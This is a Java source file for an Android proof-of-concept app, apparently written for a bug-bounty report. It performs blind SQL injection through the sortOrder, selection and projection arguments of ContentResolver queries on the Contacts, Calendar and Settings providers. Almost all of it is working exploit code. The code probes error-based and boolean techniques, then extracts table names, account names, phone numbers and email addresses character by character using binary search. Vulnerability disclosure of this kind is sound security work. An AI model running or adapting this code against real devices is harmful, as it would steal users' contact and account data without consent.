package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class ErrorBlindExtractActivity extends Activity {
    private static final String TAG = "ErrorBlind";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(6);
        logView.setText("Error-Based Blind SQL Extraction\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        log("=== Phase 0: Verify blind technique ===\n");

        // Test which technique actually works for blind boolean
        // Technique 1: CASE WHEN true/false THEN _id ELSE _id END (baseline)
        boolean t1True = testSort("content://com.android.contacts/contacts",
            "CASE WHEN 1=1 THEN _id ELSE _id END ASC");
        boolean t1False = testSort("content://com.android.contacts/contacts",
            "CASE WHEN 1=0 THEN _id ELSE _id END ASC");
        log("Technique 1 (same col): true=" + t1True + " false=" + t1False);

        // Technique 2: CASE WHEN condition THEN _id ELSE 1/0 END (error-based)
        boolean t2True = testSort("content://com.android.contacts/contacts",
            "CASE WHEN 1=1 THEN _id ELSE 1/0 END ASC");
        boolean t2False = testSort("content://com.android.contacts/contacts",
            "CASE WHEN 1=0 THEN _id ELSE 1/0 END ASC");
        log("Technique 2 (div-by-zero): true=" + t2True + " false=" + t2False);

        // Technique 3: CASE WHEN condition THEN _id ELSE abs(-9223372036854775808) END
        boolean t3True = testSort("content://com.android.contacts/contacts",
            "CASE WHEN 1=1 THEN _id ELSE abs(-9223372036854775808) END ASC");
        boolean t3False = testSort("content://com.android.contacts/contacts",
            "CASE WHEN 1=0 THEN _id ELSE abs(-9223372036854775808) END ASC");
        log("Technique 3 (overflow): true=" + t3True + " false=" + t3False);

        // Technique 4: Row count difference via CASE WHEN in WHERE
        // Using sortOrder: condition AND 0 as a poison that produces different behavior
        boolean t4True = testSort("content://com.android.contacts/contacts",
            "CASE WHEN 1=1 THEN _id ELSE (SELECT _id FROM sqlite_master WHERE 1=0) END ASC");
        boolean t4False = testSort("content://com.android.contacts/contacts",
            "CASE WHEN 1=0 THEN _id ELSE (SELECT _id FROM sqlite_master WHERE 1=0) END ASC");
        log("Technique 4 (subquery): true=" + t4True + " false=" + t4False);

        // Technique 5: Use IIF instead of CASE WHEN
        boolean t5True = testSort("content://com.android.contacts/contacts",
            "iif(1=1, _id, 1/0) ASC");
        boolean t5False = testSort("content://com.android.contacts/contacts",
            "iif(1=0, _id, 1/0) ASC");
        log("Technique 5 (iif div-zero): true=" + t5True + " false=" + t5False);

        // Technique 6: Use the condition in SELECT subquery that might error
        boolean t6True = testSort("content://com.android.contacts/contacts",
            "(SELECT CASE WHEN 1=1 THEN 1 ELSE zeroblob(999999999999) END) ASC");
        boolean t6False = testSort("content://com.android.contacts/contacts",
            "(SELECT CASE WHEN 1=0 THEN 1 ELSE zeroblob(999999999999) END) ASC");
        log("Technique 6 (huge zeroblob): true=" + t6True + " false=" + t6False);

        // Technique 7: Direct sortOrder subquery that returns different sort values
        // Instead of CASE WHEN, just use the comparison result (0 or 1) as sort key
        // We can detect this by checking cursor row order
        log("\nTechnique 7: Row-count based blind bool");
        int countNormal = testCount("content://com.android.contacts/contacts", "_id ASC");
        int countTrue = testCount("content://com.android.contacts/contacts",
            "CASE WHEN 1=1 THEN _id ELSE (SELECT RAISE(ABORT,'false')) END ASC");
        int countFalse = testCount("content://com.android.contacts/contacts",
            "CASE WHEN 1=0 THEN _id ELSE (SELECT RAISE(ABORT,'false')) END ASC");
        log("  normal count=" + countNormal + " true count=" + countTrue + " false count=" + countFalse);

        // Technique 8: Use UNICODE in sortOrder — affects sort order directly
        // The subquery result IS the sort key, not wrapped in CASE WHEN
        log("\nTechnique 8: Direct subquery as sort expression");
        boolean t8 = testSort("content://com.android.contacts/contacts",
            "(SELECT unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))) ASC");
        log("  Direct subquery sort: " + t8);

        // Technique 9: Selection-based blind bool
        // Put the condition in the WHERE clause, not sortOrder
        log("\nTechnique 9: Selection-based blind bool");
        int selTrue = testSelCount("content://com.android.contacts/contacts",
            "1=1 AND (SELECT unicode(substr('hello',1,1)))>=104");
        int selFalse = testSelCount("content://com.android.contacts/contacts",
            "1=1 AND (SELECT unicode(substr('hello',1,1)))>=200");
        log("  sel true count=" + selTrue + " sel false count=" + selFalse);

        // Technique 10: Projection-based extraction
        log("\nTechnique 10: Projection subquery");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.contacts/contacts"),
                new String[]{"(SELECT name FROM sqlite_master LIMIT 1) AS leak"},
                null, null, null);
            if (c != null && c.moveToFirst()) {
                String val = c.getString(0);
                log("  Projection leak: '" + val + "'");
                c.close();
            }
        } catch (Exception e) {
            log("  Projection: " + shorten(e.getMessage(), 80));
        }

        // Now test on CalendarProvider too
        log("\n=== CalendarProvider Blind Techniques ===\n");

        boolean calT2True = testSort("content://com.android.calendar/events",
            "CASE WHEN 1=1 THEN _id ELSE 1/0 END ASC");
        boolean calT2False = testSort("content://com.android.calendar/events",
            "CASE WHEN 1=0 THEN _id ELSE 1/0 END ASC");
        log("Calendar div-zero: true=" + calT2True + " false=" + calT2False);

        int calSelTrue = testSelCount("content://com.android.calendar/events",
            "1=1 AND (SELECT 1)>=1");
        int calSelFalse = testSelCount("content://com.android.calendar/events",
            "1=1 AND (SELECT 1)>=2");
        log("Calendar sel-count: true=" + calSelTrue + " false=" + calSelFalse);

        // Projection on CalendarProvider
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.android.calendar/events"),
                new String[]{"(SELECT name FROM sqlite_master LIMIT 1) AS leak"},
                null, null, null);
            if (c != null && c.moveToFirst()) {
                String val = c.getString(0);
                log("Calendar projection leak: '" + val + "'");
                c.close();
            }
        } catch (Exception e) {
            log("Calendar projection: " + shorten(e.getMessage(), 80));
        }

        // Selection-based on SettingsProvider
        log("\n=== SettingsProvider Blind Techniques ===\n");

        int setSelTrue = testSelCount("content://settings/secure",
            "1=1");
        int setSelFalse = testSelCount("content://settings/secure",
            "1=0");
        log("Settings sel: true=" + setSelTrue + " false=" + setSelFalse);

        // Projection on SettingsProvider
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://settings/secure"),
                new String[]{"(SELECT value FROM secure WHERE name='android_id') AS leak"},
                null, null, null);
            if (c != null && c.moveToFirst()) {
                String val = c.getString(0);
                log("Settings projection leak: '" + val + "'");
                c.close();
            }
        } catch (Exception e) {
            log("Settings projection: " + shorten(e.getMessage(), 80));
        }

        // === Now use whichever technique works to extract real data ===
        log("\n=== Phase 1: Extract Known Values ===\n");

        // Use selection-based blind on ContactsProvider
        log("ContactsProvider selection-based extraction:");
        String tableName = selBlindExtract("content://com.android.contacts/contacts",
            "(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1)", 30);
        log("  First table: " + tableName);

        int tableCount = selBlindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM sqlite_master WHERE type='table')");
        log("  Table count: " + tableCount);

        // Extract sqlite_version via selection
        String sqlVer = selBlindExtract("content://com.android.contacts/contacts",
            "sqlite_version()", 12);
        log("  SQLite version: " + sqlVer);

        log("\n=== Phase 2: Settings.Secure via ContactsProvider cross-query ===\n");

        // Can we query Settings data through ContactsProvider sortOrder?
        // No — different databases. But we CAN use selection injection on ContactsProvider.
        // And we already showed SettingsProvider sortOrder accepts injection.
        // Let's try direct Settings.Secure read via API for comparison
        try {
            String androidId = android.provider.Settings.Secure.getString(
                getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
            log("  android_id (via API): " + androidId);
        } catch (Exception e) {
            log("  android_id API: " + shorten(e.getMessage(), 60));
        }

        // Try to extract android_id via SettingsProvider blind injection
        // SettingsProvider might not use SQLite queries — test if selection injection works
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://settings/secure"),
                null,
                "name='android_id'",
                null, null);
            if (c != null) {
                log("  Settings direct query: " + c.getCount() + " rows, cols=" + c.getColumnCount());
                if (c.moveToFirst()) {
                    for (int i = 0; i < c.getColumnCount(); i++) {
                        log("    " + c.getColumnName(i) + "=" + c.getString(i));
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            log("  Settings query: " + shorten(e.getMessage(), 60));
        }

        log("\n=== Phase 3: Contacts Sensitive Data via Selection Blind ===\n");

        // Extract account info
        int acctCount = selBlindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM accounts)");
        log("Accounts: " + acctCount);
        for (int i = 0; i < Math.min(acctCount, 5); i++) {
            String acctName = selBlindExtract("content://com.android.contacts/contacts",
                "(SELECT account_name FROM accounts LIMIT 1 OFFSET " + i + ")", 50);
            String acctType = selBlindExtract("content://com.android.contacts/contacts",
                "(SELECT account_type FROM accounts LIMIT 1 OFFSET " + i + ")", 40);
            log("  [ACCT] " + acctName + " (" + acctType + ")");
        }

        // Phone numbers
        int phoneCount = selBlindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2'))");
        log("Phone numbers: " + phoneCount);
        for (int i = 0; i < Math.min(phoneCount, 5); i++) {
            String num = selBlindExtract("content://com.android.contacts/contacts",
                "(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2') LIMIT 1 OFFSET " + i + ")", 20);
            log("  [PHONE] " + num);
        }

        // Emails
        int emailCount = selBlindInt("content://com.android.contacts/contacts",
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/email_v2'))");
        log("Emails: " + emailCount);
        for (int i = 0; i < Math.min(emailCount, 3); i++) {
            String email = selBlindExtract("content://com.android.contacts/contacts",
                "(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/email_v2') LIMIT 1 OFFSET " + i + ")", 50);
            log("  [EMAIL] " + email);
        }

        log("\n=== ALL EXTRACTION TESTS COMPLETE ===");
    }

    private boolean testSort(String uri, String sortOrder) {
        try {
            Cursor c = getContentResolver().query(Uri.parse(uri),
                new String[]{"_id"}, null, null, sortOrder);
            if (c != null) { c.close(); return true; }
        } catch (Exception e) { }
        return false;
    }

    private int testCount(String uri, String sortOrder) {
        try {
            Cursor c = getContentResolver().query(Uri.parse(uri),
                new String[]{"_id"}, null, null, sortOrder);
            if (c != null) { int n = c.getCount(); c.close(); return n; }
        } catch (Exception e) { return -1; }
        return -2;
    }

    private int testSelCount(String uri, String selection) {
        try {
            Cursor c = getContentResolver().query(Uri.parse(uri),
                null, selection, null, null);
            if (c != null) { int n = c.getCount(); c.close(); return n; }
        } catch (Exception e) { return -1; }
        return -2;
    }

    // Selection-based blind boolean: uses WHERE clause injection
    private boolean selBlindBool(String uri, String condition) {
        try {
            Cursor c = getContentResolver().query(Uri.parse(uri),
                new String[]{"_id"}, "1=1 AND " + condition, null, null);
            if (c != null) {
                int count = c.getCount();
                c.close();
                return count > 0;
            }
        } catch (Exception e) { }
        return false;
    }

    private int selBlindInt(String uri, String subquery) {
        int lo = 0, hi = 10000;
        if (!selBlindBool(uri, subquery + ">0")) return 0;
        while (lo < hi) {
            int mid = (lo + hi + 1) / 2;
            if (selBlindBool(uri, subquery + ">=" + mid)) lo = mid;
            else hi = mid - 1;
            if (hi - lo <= 1) {
                if (selBlindBool(uri, subquery + "=" + hi)) return hi;
                return lo;
            }
        }
        return lo;
    }

    private String selBlindExtract(String uri, String subquery, int maxLen) {
        StringBuilder sb = new StringBuilder();
        int len = selBlindInt(uri, "(SELECT length(" + subquery + "))");
        if (len == 0) return "(empty)";
        len = Math.min(len, maxLen);
        for (int pos = 1; pos <= len; pos++) {
            String expr = "(SELECT unicode(substr(" + subquery + "," + pos + ",1)))";
            int lo = 32, hi = 126;
            while (lo < hi) {
                int mid = (lo + hi + 1) / 2;
                if (selBlindBool(uri, expr + ">=" + mid)) lo = mid;
                else hi = mid - 1;
            }
            if (selBlindBool(uri, expr + "=" + lo)) sb.append((char) lo);
            else sb.append('?');
        }
        return sb.toString();
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
